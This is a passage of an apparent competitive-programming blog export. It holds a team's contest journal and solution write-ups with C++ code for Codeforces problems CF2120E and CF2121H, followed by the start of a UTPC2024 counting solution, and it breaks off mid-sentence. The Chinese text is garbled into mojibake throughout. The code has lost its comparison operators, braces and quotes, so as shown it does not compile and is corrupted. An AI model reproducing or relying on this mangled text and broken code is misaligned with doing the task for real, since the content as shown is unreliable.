å†™é”™äº†ï¼Œäºæ˜¯ç–¯ç‹‚å¯¹ç€ä¸€ä»½å…¶å®æ—©å·²æ­£ç¡®çš„ä»£ç è°ƒè¯•ï¼Œ2.5 h æ‰è¿‡äº† Bã€‚ Sky æœ‰è¨€ï¼š æˆ‘è§‰å¾—å§ï¼Œä¸€é“é¢˜å°±åº”è¯¥ä¸€ä¸ªäººå†™ï¼Œæ‹¼å¥½é¢˜å¯ä»¥æ‹¼æ€è·¯ï¼æˆ‘è§‰å¾—å§ï¼Œæˆ‘ä»¬è‡³å°‘å…ˆè½å®ä¸€ä¸ªäº‹æƒ…ï¼Œå°±æ˜¯æ¯ä¸ªäººéƒ½çœ‹ä¸€éæ¯é“é¢˜ï¼Œä¸€åœºæ¯”èµ›è‡³å°‘å¾—æŠŠæ‰€æœ‰é¢˜çœ‹ä¸€éã€‚$\\tiny\\text{æˆ‘è§‰å¾—å§ï¼Œæ‰“æˆè¿™æ ·è‚¯å®šæ˜¯å› ä¸º Zlw ä¸ Scy å¤ªä¾é  Sky ä½¬è¿‡é¢˜äº†ï¼}$ ã€Scy ã®è¡¥é¢˜ã€‘ G ç®€ç›´ä¸ºç¬›å¡å°”æ ‘é‡èº«å®šåˆ¶ã€‚è®¾æœ€åä¸€ä¸ªåˆ é™¤çš„æ•°ä¸ºç¬¬ $i$ ä¸ªæ•°ï¼Œåˆ™æœ€åå‰©ä½™åŒºé—´ä¸€å®šæ˜¯ $[l,r] (l \\le i \\le r)$ï¼Œå…¶ä¸­ $r - l + 1$ å³ä¸ºå»ºç«‹å®Œç¬›å¡å°”æ ‘å $i$ èŠ‚ç‚¹çš„å­æ ‘å¤§å° $sz_i$ã€‚å› æ­¤ï¼Œå¯ä»¥ç•™å‡ºä¸è¶…è¿‡ $sz_i - 1$ ä¸ªä½ç½®ç»™åŒºé—´å¤–çš„æ•°ï¼Œæ¯å±‚åªå¯èƒ½æœ‰ $1$ ä¸ªã€‚ç”±æ’æ¿æ³•å¯çŸ¥ç­”æ¡ˆä¸º $\\sum \\limits _{k = 0}^{sz_i - 1}\\binom{k + dep - 1}{dep - 1}$ã€‚ ä¸‹é¢æ¥æ¨ä¸ªå¼å­ï¼š \\sum \\limits _{k = 0}^{sz_i - 1}\\binom{k + dep - 1}{dep - 1} = \\binom{dep - 1}{dep - 1} + \\binom{dep}{dep - 1} + \\cdots + \\binom{dep + sz - 2}{dep - 1} \\\\ = \\binom{dep}{dep} + \\binom{dep}{dep - 1} + \\cdots + \\binom{dep + sz - 2}{dep - 1}åˆå› ä¸º \\binom{n - 1}{m - 1} + \\binom{n - 1}{m} = \\binom{n}{m}æ‰€ä»¥æœ€åç¬¬ $i$ ä¸ªæ•°ä½œä¸ºæœ€åä¸€ä¸ªæ•°åˆ é™¤çš„æ–¹æ¡ˆæ•°ä¸º $\\binom{dep + sz - 1}{dep}$ã€‚æœ€åè¿˜éœ€è¦åŠ ä¸Šå…¨éƒ¨ä¸ºç©ºçš„æƒ…å†µï¼Œè´¡çŒ®ä¸º $1$ã€‚ 2025ç‰›å®¢æš‘æœŸå¤šæ ¡è®­ç»ƒè¥10 ã€çœæµç‰ˆã€‘å¥½æ¶ˆæ¯ï¼šä¸¤å°æ—¶ä¸åˆ°å°±äº”é¢˜äº†ï¼åæ¶ˆæ¯ï¼šäº”å°æ—¶ä»¥åè¿˜æ˜¯äº”é¢˜ï¼$5/12$ é¢˜ï¼Œ$\\texttt{rank 205/1391}$ã€‚ ã€Zlw Scyã€‘å¼€å±€ Zlw å†™äº† Dï¼Œå‘ç°å¦‚æœè¿ç»­ä¸¤ä½ç›¸ç­‰å¿…ç„¶å‡ºç°ä¿¡æ¯ä¸¢å¤±ï¼Œé—®äº†ä¸‹ Scy å’Œ Sky è¯´æ˜¯ä¸‰æ¬¡äº¤æ›¿å¼‚æˆ–å¯ä»¥äº¤æ¢ã€‚ä½†æ˜¯ä¸€å¼€å§‹å¿½ç•¥äº†äº¤æ¢ä¸¤æ¬¡åˆæ¢å›æ¥äº†ï¼Œä»¥ä¸ºæ˜¯ $n \\bmod 3=1$ ç„¶åç­”æ¡ˆé”™è¯¯ã€‚çœ‹äº†åŠå¤©æ²¡çœ‹å‡ºé—®é¢˜ï¼Œå« fw Scy è¿‡æ¥çœ‹çœ‹ã€‚Scy æƒ³äº†å¾ˆä¹…çªç„¶å‘ç° Zlw ä½¬æŠŠäº¤æ¢å¶æ•°æ¬¡ï¼ˆç›¸å½“äºåˆæ¢å›æ¥äº†çš„æƒ…å†µï¼‰ä¹Ÿç®—åˆ°ç­”æ¡ˆé‡Œäº†ï¼Œä¿®æ”¹æˆ $n \\bmod 6=4$ ä»¥åé€šè¿‡ã€‚ ã€Zlw Skyã€‘H ä¸€é“ç®€å•å°é¢˜ã€‚è€ƒè™‘å¼å­ä¸º a()b=ï¼Œå…¶ä¸­æ‹¬å·é‡Œèƒ½å¡« +ã€-ã€*ï¼Œä¸ºäº†å¾—åˆ°æœ€çŸ­å¯¹ç§°ï¼Œåˆ†æƒ…å†µè®¨è®ºä¸€ä¸‹å³å¯ã€‚å¾ˆå¿«å‘ç°å¹¶è¯æ˜äº†åŠ æ³•å’Œä¹˜æ³•åˆæ³•çš„å……è¦æ¡ä»¶æ˜¯ $a eq b$ã€‚a å’Œ b ç›¸åŒçš„æ—¶å€™ä¸€å®šæ˜¯ =a()a=ï¼Œå³ä¸åˆæ³•ã€‚ä¸åŒçš„æ—¶å€™å†è€ƒè™‘ a()b=b()aï¼Œé•¿åº¦ä¸º 7ã€‚ä½†æ˜¯ç”±äºé€šè¿‡ç‡ç‰¹åˆ«ä½ï¼Œä¸€ç›´åœ¨æ‰¾åä¾‹ã€‚ä¸­é—´å¿ä¸ä½äº¤äº†ä¸€å‘ç½šæ—¶ã€‚æœ€åå®åœ¨æ²¡åŠæ³•æš´åŠ›æšä¸¾å‡æ³•çš„æ‰€æœ‰æƒ…å†µï¼Œå‘ç° $a=0$ å­˜åœ¨ç‰¹ä¾‹ã€‚ç„¶ååˆç”±äºä¸€ä¸ªä½çº§å¤±è¯¯ç½šäº†ä¸€æ¬¡æ—¶ã€‚ ã€Scyã€‘å‘ç° I æ˜¯æ„é€ ï¼Œè§‚å¯Ÿåˆ°çŸ©é˜µæ€§è´¨ç‰¹åˆ«å¼ºï¼Œæ¯æ¬¡éƒ½éœ€è¦è·³å¯¹åº”çš„æ•°é‡ã€‚çœ‹äº†é¢˜ç›®åå¤–å–åˆ°äº†ï¼Œäºæ˜¯å³æ‰‹åƒé¥­ï¼Œå·¦æ‰‹çº¸ç¬”è¿·é¢˜ï¼Œç„¶åå°±çªç„¶å‘ç°å¥½åƒç©å‡ºæ¥äº†ã€‚ä»¤ $n m$ï¼Œä»å·¦ä¸Šè§’å¼€å§‹ï¼ŒæŒ‰æ•°å­—é¡ºåºå…ˆå‘ä¸‹è·³ï¼Œå†å‘ä¸Šè·³ï¼Œæ¯ä¸€åˆ—è·³æ»¡äº†ä¹‹åå†å‘å·¦/å³è·³ã€‚è¯•äº†ä¸€ä¸‹ï¼Œç®—æ³•æ­£ç¡®ï¼Œç„¶åçŒœæƒ³æ— è§£å¯èƒ½æ˜¯è‡ªç„¶çš„ã€‚Sky é€šè¿‡åŒä½™æ–¹ç¨‹è¯æ˜å‡º $\\gcd (n,m) = 1$ æ—¶æ‰æœ‰è§£ï¼Œå’Œæˆ‘çš„çŒœæƒ³æ®Šé€”åŒå½’ã€‚ä¸€å‘æäº¤å ACã€‚ ã€Zlwã€‘æ¯”è¾ƒæ¸…ç§€çš„æ•°æ®ç»“æ„é¢˜ï¼ŒScy åœ¨å†™æ„é€ çš„æ—¶å€™çœ‹äº†ä¸€ä¸‹ï¼Œå¾ˆå¿«å‘ç°æšä¸¾ $b_2$ å†å»ç»´æŠ¤æ¯ä¸ª $b_3$ çš„ç­”æ¡ˆå°±å¥½äº†ï¼Œå†™ä¸ªçº¿æ®µæ ‘è¿‡äº†ã€‚ ã€Scy Zlwã€‘Zlw å…ˆçœ‹äº† Eï¼Œæƒ³åˆ° $m = 1$ æ—¶ç›´æ¥è´ªå¿ƒå½’ä¸€åˆ°æœ€å¤§å€¼å³å¯ã€‚ç„¶ååˆæå‡º $m = 2$ æ—¶æ˜¯ä¸€ä¸ªæœ€å¤§å€¼ï¼Œä¸€ä¸ªå…¶ä»–å€¼ã€‚ç„¶å Scy æŠŠè¿™ä¸ªæƒ³æ³• hack äº†ï¼Œåä¾‹æ˜¯ 5 1 1 1 10 1 1ï¼Œè¿™æ—¶å€™ä¸¤ä¸ªæ•°æ˜¾ç„¶ä¸º $5,14$ã€‚ æƒ³äº†ä¸€ä¼šå„¿ï¼Œè§‰å¾—å¯ä»¥ç›´æ¥æšä¸¾è¿™ä¸¤ä¸ªå€¼ï¼Œä¸Šç•Œåœ¨ $2\\max\\{a_i\\}$ï¼Œç„¶åè®¾ $dp_{i,0/1}$ è¡¨ç¤ºç¬¬ $i$ ä¸ªæ•°æœ€åä¸ºæšä¸¾çš„å‰è€…/åè€…çš„å€¼æ—¶çš„æœ€å°ç­”æ¡ˆã€‚è‹¥å‰é¢æ“ä½œæ¬¡æ•°ä¸å°äºå½“å‰æ•°å­—æ‰€éœ€çš„æ¬¡æ•°ï¼Œåˆ™ç›´æ¥â€œå…è´¹â€ï¼Œæ€»æ¬¡æ•°å˜ä¸ºè¾ƒå°å€¼ï¼›å¦åˆ™èŠ±è´¹æ¬¡æ•°ä¸º $\\Delta$ï¼Œæ€»æ¬¡æ•°ä¸ºå½“å‰å€¼ã€‚ Zlw ç¡®è®¤äº† Scy çš„åšæ³•ï¼Œæšä¸¾ä¸¤ä¸ªæœ€ç»ˆå€¼ç„¶å $O(n)$ è·‘ä¸€é DP å°±å¥½ã€‚ç”±äº Zlw æ¯”è¾ƒæ“…é•¿ DPï¼Œäºæ˜¯ç›´æ¥ç”©é”…ç»™ä»–æ¥å†™äº†ï¼Œä¸€å‘ ACã€‚ ã€Scyã€‘å¸å–ä¸Šæ¬¡çš„æ•™è®­ï¼Œå†³å®šé¢˜ç›®éƒ½çœ‹ä¸€ä¸‹ï¼Œçœ‹äº† A,C,Jã€‚A æ˜¯çº¯å¤§æ¨¡æ‹Ÿï¼Œå®ç°æ ¼å¼åŒ–ç¨‹åºçš„åŠŸèƒ½ã€‚é¢˜ç›®è¶…çº§éš¾æ‡‚ï¼Œå¤§æ¦‚çœ‹äº† 30 min æ‰ä¼¼æ‡‚éæ‡‚ï¼Œä½†æ˜¯ç”±äºç»†èŠ‚å¤ªå¤šäº†ï¼Œè¿Ÿè¿Ÿä¸æ•¢ä¸‹æ‰‹ï¼Œä»¥è‡³äºåˆ°æ¯”èµ›ç»“æŸä¹Ÿæ²¡å†™ï¼ˆä¸è¿‡èµ›æ—¶åªæœ‰ 4 ä¸ªé˜Ÿä¼é€šè¿‡äº†è¿™é“é¢˜ï¼‰ã€‚C æ˜¯æœç´¢+æ„é€ é¢˜ï¼Œæ„é€ éœ€è¦èŠ±è´¹å¾ˆé•¿æ—¶é—´ï¼Œé™¤éçˆ†æœï¼Œæœ€åä¹Ÿæ²¡å†™ã€‚ï¼ˆä¸»è¦æ˜¯æƒ³äº†ä¸€ä¼šå„¿ä¸€èµ·å»çœ‹ K äº†ï¼Œå¦‚æœå‰©ä¸‹ä¸‰å°æ—¶å»å†™è¿™é“é¢˜æˆ–è®¸èƒ½å¤Ÿæ„é€ å‡ºæ¥ã€‚ä½†æ˜¯è¿™é¢˜æ®è¯´ç½‘ä¸Šä¹Ÿèƒ½æ‰¾åˆ°ç°æˆçš„ç­”æ¡ˆï¼Œæœ‰ç‚¹è¿·æƒ‘ã€‚è‡³äºçˆ†æœï¼Œç›´æ¥ç”¨å“ˆå¸Œçš„æ–¹å¼æ¥æ˜ å°„è¿™ $60$ ç§ç§¯æœ¨å—å³å¯ã€‚J çš„è¯ä¹Ÿæœ‰æ„é€ +è®¡ç®—å‡ ä½•çš„å‘³é“ï¼Œå†™ä¸äº†ã€‚ï¼‰ ã€Zlw Skyã€‘K é¢˜æ„æœ‰ç‚¹æ¨¡ç³Šï¼Œè€ƒè™‘å…ˆç”¨ Tarjan ç¼©ç‚¹ï¼Œç„¶åå†è¿›è¡Œä¸€ä¸ªå­æ ‘è®¡ç®—åˆå¹¶ï¼Œå¼å­æ˜¯ $C = \\{x+y, x \\in A, y \\in B\\} \\cup A \\cup B$ã€‚å‘ç°ç¼©ç‚¹å®Œä»¥åè¿˜æ˜¯ä¸€æ£µæ ‘ï¼Œç†è®ºä¸Šå¯ä»¥ç›´æ¥ç±»æ ‘å½¢èƒŒåŒ…ã€‚ä½†æ˜¯è¿™ä¸ªæ—¶å€™å¿˜äº†æ ‘å½¢èƒŒåŒ…çš„ç»å…¸ç»“è®ºå¯ä»¥æ‰©å±•åˆ°ä»»æ„ç‰©å“é‡é‡ï¼Œä¸€ç›´ä»¥ä¸ºæ˜¯ä¸‰æ¬¡æ–¹ï¼Œç”šè‡³å¼€å§‹å°è¯• bitset å’Œ NTTï¼Œæœ€åè¿˜æ˜¯æ²¡å¡è¿‡å»ã€‚èµ›åå‘ç°ç›´æ¥åšå°±æ˜¯å¯¹çš„ã€‚ ã€åè®°ã€‘ æ€»æ’åè§„åˆ™ï¼š$\\color{purple}{å•åœºå¾—åˆ† = 100 \\times\\frac{è§£é¢˜æ•°}{ç¬¬ä¸€åçš„è§£é¢˜æ•°}\\times \\frac{2\\times æœ¬åœºå‚èµ›é˜Ÿä¼æ•°-2}{æœ¬åœºå‚èµ›é˜Ÿä¼æ•°+åæ¬¡-2}}$ã€‚æ€»æ’åæŒ‰åˆ†æ•°æœ€é«˜çš„ 5 åœºä¹‹å’Œï¼Œå‚èµ›ä¸è¶³ 5 åœºçš„é˜Ÿä¼ï¼ŒæŒ‰æ‰€æœ‰å‚èµ›åœºæ¬¡çš„å¾—åˆ†ä¹‹å’Œè®¡ç®—ã€‚ æµ·å¤–é‚€è¯·æ¥çš„é€‰æ‰‹ä¸è®¡å…¥æ€»æ’åã€‚ å‰ $10\\%$ æ˜¯ $173$ åï¼Œæˆ‘ä»¬ $\\texttt{rk }230$ï¼Œå‹‰å¼ºå§ï¼","categories":["Journal"]},{"title":"é¢˜è§£ï¼šCF2120E Lanes of Cars","path":"/2025/06/29/CF2120E/","content":"æ ¹æ®è´ªå¿ƒï¼Œä¸éš¾æƒ³åˆ°æ¯æ¬¡ä¼šæŠŠæœ€é•¿é˜Ÿä¼æœ«å°¾çš„é‚£è¾†è½¦ç§»åŠ¨åˆ°æœ€çŸ­é˜Ÿä¼çš„æœ«å°¾ã€‚ä½†ç”±äº $k$ çš„å­˜åœ¨ï¼Œä¼šå¯¼è‡´ä¸€äº›å†—ä½™ç§»åŠ¨çš„å­˜åœ¨ã€‚è®¾éœ€è¦æŒªåŠ¨ $C$ è¾†è½¦ï¼Œåˆ™æ€’æ°”å€¼å¯ä»¥è¡¨ç¤ºä¸º $f(C) + kC$ï¼Œå…¶ä¸­ $f(C)$ æ˜¯æ’é˜Ÿæ‰€äº§ç”Ÿçš„æ€’æ°”å€¼ï¼Œ$kC$ ä¸ºå˜é“äº§ç”Ÿçš„é¢å¤–æ€’æ°”å€¼ã€‚ä»”ç»†åˆ†æä»¥åï¼Œå¯ä»¥å‘ç°è¿™æ˜¯ä¸€ä¸ªå‡¸å‡½æ•°ï¼Œå› æ­¤è€ƒè™‘ä¸‰åˆ†ç­”æ¡ˆã€‚ ä¸€å¼€å§‹æƒ³è¦ä¸‰åˆ†éœ€è¦æŒªè½¦çš„æœ€çŸ­é•¿åº¦ $y$ï¼Œä½†æ˜¯ä¸èƒ½å¿½ç•¥ $k$ çš„å½±å“ï¼Œæœ‰äº›é˜Ÿä¼çš„é•¿åº¦è™½ç„¶ $ y$ï¼Œä½†æŒªåŠ¨ä¸ç§»åŠ¨ä¼šæ›´ä¼˜ã€‚äºæ˜¯ä¸‰åˆ†æŒªåŠ¨è½¦è¾†çš„æ•°é‡æ‰æ˜¯æœ€ä¼˜çš„ã€‚ å…·ä½“æ¥è¯´ï¼Œå¯ä»¥æšä¸¾å“ªäº›é˜Ÿä¼çš„è½¦è¾†ä¼šå‡å°‘/å¢åŠ ã€‚è‹¥ç°åœ¨è€ƒè™‘ä¼šå‡å°‘çš„é˜Ÿä¼çš„è½¦è¾†ï¼Œç»™ $a_i$ æ’åºåï¼Œè®¾å½“å‰æœ€é•¿é˜Ÿä¼çš„è½¦è¾†æ•°ä¸º $x$ï¼Œæ¬¡é•¿çš„ä¸º $y$ ($x eq y$)ï¼Œç„¶åé•¿åº¦ä¸º $x,y$ çš„é˜Ÿä¼çš„æ•°é‡åˆ†åˆ«ä¸º $f_x,f_y$ã€‚è‹¥å…±éœ€è¦ç§»åŠ¨ $C$ è¾†è½¦ï¼Œåˆ™æœ‰ä¸¤ç§æƒ…å†µ: $C \\ge (x - y) \\times f_x$ï¼Œä¹Ÿå°±æ˜¯è¯´é•¿åº¦ä¸º $x$ çš„è½¦å¯ä»¥ç›´æ¥å˜ä¸º $y$ï¼Œ$C \\leftarrow C - (x - y) \\times f_x; f_y \\leftarrow f_x + f_y; f_x \\leftarrow 0$ã€‚ $C (x - y) \\times f_x$ï¼Œæ­¤æ—¶ä¼šäº§ç”Ÿæ–°çš„é˜Ÿä¼é•¿åº¦ï¼Œä¹Ÿå°±æ˜¯ $C \\leftarrow 0; f_{x - \\lfloor\\frac{C}{f_x}\\rfloor - 1} \\leftarrow f_{x - \\lfloor\\frac{C}{f_x}\\rfloor - 1} + C \\bmod f_x; \\leftarrow f_{x - \\lfloor\\frac{C}{f_x}\\rfloor} + (f_x - C \\bmod f_x)$ã€‚ å¯ä»¥å‘ç°æœ€åé˜Ÿä¼é•¿åº¦çš„ç§ç±»æ•°ä¸ä¼šè¶…è¿‡ $n + 2$ï¼Œå› æ­¤è¿™æ˜¯ $O(n)$ çš„ã€‚è€ƒè™‘å¢åŠ çš„é˜Ÿä¼çš„è½¦è¾†åŒç†ï¼Œç”¨ STL æ¥å†™ä¼šç®€å•ä¸€ç‚¹ã€‚ä½†æ˜¯ç”±äºå¤šäº†ä¸€æ”¯ $\\log$ï¼Œå®æµ‹ä¼šè¶…æ—¶ï¼š ll tot = sum * k,res = sum,number = sum;set int s;map int,int bg,sm;s.insert (-1e9);for (int i = 1;i = n;++i) s.insert (a[i]),++bg[a[i]];while (sum) int x = *(--s.end ()),num = bg[x];s.erase (x); int y = *(--s.end ()); if (sum = 1ll * (x - y) * num) sum -= 1ll * (x - y) * num; bg[y] += num;bg[x] = 0; else bg[x] = 0; int tmp = sum % num; if (tmp) bg[x - sum / num - 1] += tmp; bg[x - sum / num] += num - tmp; sum = 0; s.clear ();for (auto [x,num] : bg) if (num) s.insert (x),sm[x] = num;s.insert (1e9);while (res) int x = *s.begin (),num = sm[x];s.erase (x); int y = *s.begin (); if (res = 1ll * (y - x) * num) res -= 1ll * (y - x) * num; sm[y] += num;sm[x] = 0; else sm[x] = 0; int tmp = res % num; if (tmp) sm[x + res / num + 1] += tmp; sm[x + res / num] += num - tmp; res = 0; for (auto [x,num] : sm) tot += 1ll * x * (x + 1) / 2 * num;return tot;; å†æ¬¡æ€è€ƒå¯ä»¥å‘ç° STL çš„ $\\log$ å®Œå…¨æ˜¯å¤šä½™çš„ï¼Œå¯ä»¥é€šè¿‡æ•°ç»„æ¥æ›¿ä»£ï¼Œä½†éœ€è¦å°å¿ƒæ¸…ç©ºä¸å»é‡çš„é—®é¢˜ã€‚æœ€åçš„ AC ä»£ç å¦‚ä¸‹ï¼Œæ—¶é—´å¤æ‚åº¦ $O(n \\log n)$ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 2e18#define pii pair int,intusing namespace std;const int MAX = 2e5 + 5;const int MOD = 1e9 + 7;inline int read ();int a[MAX],b[MAX];vector int bg (1000001,0),sm (1000001,0);void solve () int n = read (),k = read ();ll ans = INF; for (int i = 1;i = n;++i) a[i] = read (); sort (a + 1,a + 1 + n); auto check = [] (ll sum) - ll ll tot = sum * k,res = sum;int cnt = 0; vector int p; for (int i = 1;i = n;++i) p.push_back (a[i]); for (int i = 1;i = n;++i) if (!bg[a[i]]) b[++cnt] = a[i]; ++bg[a[i]]; b[0] = -1e9; while (sum 0) int x = b[cnt--],num = bg[x]; int y = b[cnt]; if (sum = 1ll * (x - y) * num) sum -= 1ll * (x - y) * num; bg[y] += num;bg[x] = 0; else bg[x] = 0; int tmp = sum % num; bg[x - sum / num] += num - tmp,p.push_back (x - sum / num); if (tmp) bg[x - sum / num - 1] += tmp,p.push_back (x - sum / num - 1); sum = 0; cnt = 0; for (auto v : p) if (bg[v]) b[++cnt] = v,sm[v] = bg[v],bg[v] = 0; p.clear (); for (int i = 1;i = cnt;++i) p.push_back (b[i]); b[++cnt] = 1e9;cnt = 1; while (res 0) int x = b[cnt++],num = sm[x]; int y = b[cnt]; if (res = 1ll * (y - x) * num) res -= 1ll * (y - x) * num; sm[y] += num;sm[x] = 0; else sm[x] = 0; int tmp = res % num; if (tmp) sm[x + res / num + 1] += tmp,p.push_back (x + res / num + 1); sm[x + res / num] += num - tmp,p.push_back (x + res / num); res = 0; for (auto v : p) tot += 1ll * v * (v + 1) / 2 * sm[v],sm[v] = 0; return tot; ; ll l = 0,r = accumulate (a + 1,a + n + 1,0ll); while (l r) ll midl = l + (r - l) / 3,midr = r - (r - l) / 3; ll v1 = check (midl),v2 = check (midr); ans = min (ans,min (v1,v2)); if (v1 = v2) r = midr - 1; else l = midl + 1; printf (%lld ,ans);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2121H Ice Baby","path":"/2025/06/26/CF2121H/","content":"è®¾ $f_i$ è¡¨ç¤ºç­”æ¡ˆé•¿åº¦ä¸º $i$ æ—¶ï¼Œç»“å°¾çš„æœ€å°å€¼ã€‚å› æ­¤å½“ $f_{i - 1} \\le r_i$ æ—¶å¯ä»¥è¿›è¡Œè½¬ç§» $f_i = \\max (f_{i - 1},l_i)$ã€‚äºæ˜¯å¯ä»¥å¾—åˆ° $O(n^2)$ çš„ä»£ç ï¼š for (int i = 1;i = n;++i) for (int j = i;j;--j) if (dp[j - 1] r[i]) continue; dp[j] = min (dp[j],max (dp[j - 1],l[i])); ans = max (ans,j); coutans [i == n]; æŒ‰ç…§å®˜æ–¹é¢˜è§£çš„æ€è·¯å¯ä»¥ç”¨ multiset ä¼˜åŒ–åˆ° $O(n \\log n)$ï¼Œåœ¨æ­¤ä¸èµ˜è¿°ã€‚ æ¢ä¸€ç§è§’åº¦ï¼Œè®¾ $f_i$ è¡¨ç¤ºæœ€åä¸€ä¸ªæ•°å­—ä¸º $i$ æ—¶çš„æœ€å¤§é•¿åº¦ã€‚åˆ™åœ¨é‡åˆ°ç¬¬ $k$ ä¸ªåŒºé—´ $[l_k,r_k]$ æ—¶ï¼Œæœ‰ $f_{l_k} = \\max\\limits_{j \\mid j \\le l_k}\\{f_j\\} + 1$ï¼Œçº¿æ®µæ ‘ç»´æŠ¤æœ€å¤§å€¼å³å¯ã€‚è€Œ $f_{l_k + 1} \\sim f_r$ å°±å¯ä»¥ä¿æŒåŸæ¥çš„æ•°å­—ä¸å˜ï¼Œç›¸å½“äºåŒºé—´åŠ ä¸€ã€‚æœ€åçš„ç­”æ¡ˆå°±æ˜¯å…¨å±€æœ€å¤§å€¼ã€‚ åˆå› ä¸ºå€¼åŸŸè¾ƒå¤§ï¼Œéœ€è¦å…ˆè¿›è¡Œç¦»æ•£åŒ–æ“ä½œã€‚æœ€åï¼Œæˆ‘ä»¬å¯ä»¥å¾—åˆ°çº¿æ®µæ ‘ä¼˜åŒ–åˆ° $O (n \\log n)$ ä»£ç ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 4e5 + 5;const int MOD = 1e9 + 7;inline int read ();int tree[MAX 2],tmp[MAX 2];void pushup (int cur) tree[cur] = max (tree[cur 1],tree[cur 1 | 1]);void pushdown (int cur) if (!tmp[cur]) return ; tree[cur 1] += tmp[cur];tree[cur 1 | 1] += tmp[cur]; tmp[cur 1] += tmp[cur];tmp[cur 1 | 1] += tmp[cur]; tmp[cur] = 0;void build (int cur,int l,int r) tree[cur] = tmp[cur] = 0; if (l == r) return ; int mid = (l + r) 1; build (cur 1,l,mid);build (cur 1 | 1,mid + 1,r);void modify1 (int cur,int l,int r,int x,int v) if (l == r) tree[cur] = v;return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify1 (cur 1,l,mid,x,v); else modify1 (cur 1 | 1,mid + 1,r,x,v); pushup (cur);void modify2 (int cur,int l,int r,int x,int y) if (y l || x r) return ; if (x = l y = r) ++tree[cur];++tmp[cur];return ; int mid = (l + r) 1; pushdown (cur); if (x = mid) modify2 (cur 1,l,mid,x,y); if (y mid) modify2 (cur 1 | 1,mid + 1,r,x,y); pushup (cur);int query (int cur,int l,int r,int x,int y) if (y l || x r) return 0; if (x = l y = r) return tree[cur]; int mid = (l + r) 1,res = 0; pushdown (cur); if (x = mid) res = max (res,query (cur 1,l,mid,x,y)); if (y mid) res = max (res,query (cur 1 | 1,mid + 1,r,x,y)); return res;void solve () int n = read (); vector int l (n + 1),r (n + 1),num; for (int i = 1;i = n;++i) l[i] = read (),r[i] = read (),num.push_back (l[i]),num.push_back (r[i]); sort (num.begin (),num.end ()); num.erase (unique (num.begin (),num.end ()),num.end ()); int tot = num.size ();build (1,1,tot); //f[i] è¡¨ç¤ºæœ€åä¸€ä¸ªæ•°å­—ä¸º i æ—¶çš„æœ€å¤§é•¿åº¦ for (int i = 1;i = n;++i) l[i] = lower_bound (num.begin (),num.end (),l[i]) - num.begin () + 1; r[i] = lower_bound (num.begin (),num.end (),r[i]) - num.begin () + 1; modify1 (1,1,tot,l[i],query (1,1,tot,1,l[i]) + 1); modify2 (1,1,tot,l[i] + 1,r[i]); couttree[1] [i == n]; int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼š[UTPC2024] C.Card Deck","path":"/2025/06/07/UTPC2024C/","content":"é¢˜ç›®é“¾æ¥ï¼Œæ„Ÿè§‰æ˜¯è®¡æ•°ç¥é¢˜ã€‚ åŸé¢˜çš„æ¨¡å‹æ˜¯æ¯ä¸€æ­¥å¯ä»¥é€‰æ‹©é¡¶éƒ¨ $k$ å¼ ç‰Œçš„ä¸€ä¸ªå­é›† $X_i$(å¯ä»¥ä¸ºç©ºï¼‰æ”¾åœ¨è¢‹ä¸­ï¼Œæ±‚ $m$ è½®ä¹‹åæ‰€æœ‰å¯èƒ½çš„è¢‹å­é‡Œç‰Œæ‰€ç»„æˆçš„é›†åˆçš„å¤§å°ä¹‹å’Œã€‚è€ƒè™‘è¿›è¡Œè½¬åŒ–ï¼Œåªè€ƒè™‘å‰ $k$ å¼ ç‰Œï¼Œæ¯å¼ ç‰Œéƒ½æœ‰ä¸€ä¸ªå±æ€§ $t_i \\in \\{0,1,\\cdots,m\\}$ã€‚è‹¥ $t_i = 0$ï¼Œè¡¨ç¤ºè¿™å¼ ç‰Œæ°¸è¿œä¸ä¼šè¢«æ”¾å…¥è¢‹å­ä¸­ï¼Œå¦åˆ™è¡¨ç¤ºè¿™å¼ ç‰Œä¼šåœ¨ç¬¬ $t_i$ è½®è¢«æ”¾å…¥è¢‹å­ä¸­ã€‚è‹¥ $S_j$ è¡¨ç¤ºç¬¬ $j$ è½®åè¢‹å­é‡Œçš„æ•°ï¼Œæœ€åæ±‚ $\\sum \\limits_{i = 1}^m |S_j|$ã€‚ è®¾ä¸¤ä¸ªæ¨¡å‹ä¸º $A,B$ï¼Œä¸‹è¯æ˜ä¸¤ä¸ªæ¨¡å‹ç­‰ä»·ã€‚ è¯æ˜ $A \\to B$\\å¯¹äº $\\forall i \\in [1,k]$ï¼Œè‹¥ $i \\in X_j$ åˆ™æœ‰ $t_i = j$ï¼Œå¦åˆ™ $t_i = 0$ã€‚ $B \\to A$\\åœ¨è¿›è¡Œç¬¬ $j$ æ­¥å‰ï¼Œæ‰€æœ‰ $t_i j$ çš„ç‰Œéƒ½å·²ç»æ”¾å…¥è¢‹ä¸­ï¼Œæ€»å…±æœ‰ $|\\{i \\mid t_i j\\}|$ å¼ ã€‚ç”±äºæ”¾å…¥è¢‹ä¸­åä¼šè¿›è¡Œè¡¥ä½ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¹¶ä¸å…³å¿ƒè¡¥è¿›æ¥çš„æ˜¯å“ªä¸€å¼ çœŸæ­£çš„åŸå§‹ç‰Œï¼Œå½“è¿›è¡Œç¬¬ $j$ æ­¥å‰ï¼Œç‰Œå †çš„å‰ $k$ å¼ ç‰Œä¸€å®šå­˜åœ¨æ‰€æœ‰ $t_i = j$ çš„ç‰Œï¼Œä¹Ÿå°±æ˜¯è¯´ç¬¬ $j$ æ­¥åˆ æ‰ $\\{i \\mid t_i = j\\}$ æ˜¯åˆæ³•æ“ä½œã€‚ å› æ­¤å¯ä»¥å¯¹æ¯ä¸€å¼ 